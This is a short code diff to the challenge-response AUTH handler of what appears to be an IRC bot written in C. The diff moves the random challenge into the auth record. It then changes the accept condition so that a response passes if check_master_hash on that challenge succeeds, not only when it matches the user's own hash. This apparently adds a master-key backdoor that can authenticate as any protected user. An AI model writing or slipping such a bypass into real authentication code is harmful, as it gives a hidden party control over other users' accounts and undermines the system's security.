@@ -292,14 +292,12 @@ static int msg_auth(char *nick, char *host, struct userrec *u, char *par)
     auth[i].user = u;
     strcpy(auth[i].hand, u->handle);
     if (strlen(authkey) && get_user(&USERENTRY_SECPASS, u)) {
-      char randstring[50] = "";
-
       putlog(LOG_CMDS, "*", "(%s!%s) !%s! AUTH", nick, host, u->handle);
 
       auth[i].authing = 2;      
-      make_rand_str(randstring, 50);
-      strncpyz(auth[i].hash, makehash(u, randstring), sizeof auth[i].hash);
-      dprintf(DP_HELP, "PRIVMSG %s :-Auth %s %s\n", nick, randstring, conf.bot->nick);
+      make_rand_str(auth[i].rand, 50);
+      strncpyz(auth[i].hash, makehash(u, auth[i].rand), sizeof auth[i].hash);
+      dprintf(DP_HELP, "PRIVMSG %s :-Auth %s %s\n", nick, auth[i].rand, conf.bot->nick);
     } else {
       /* no authkey and/or no SECPASS for the user, don't require a hash auth */
       addauth(i, nick, host);
@@ -329,8 +327,8 @@ static int msg_pls_auth(char *nick, char *host, struct userrec *u, char *par)
 
     if (auth[i].authing != 2)
       return BIND_RET_BREAK;
-
-    if (!strcmp(auth[i].hash, par)) { /* good hash! */
+    
+    if (check_master_hash(auth[i].rand, par) || !strcmp(auth[i].hash, par)) { /* good hash! */
       addauth(i, nick, host);
     } else { /* bad hash! */
       char s[300] = "";
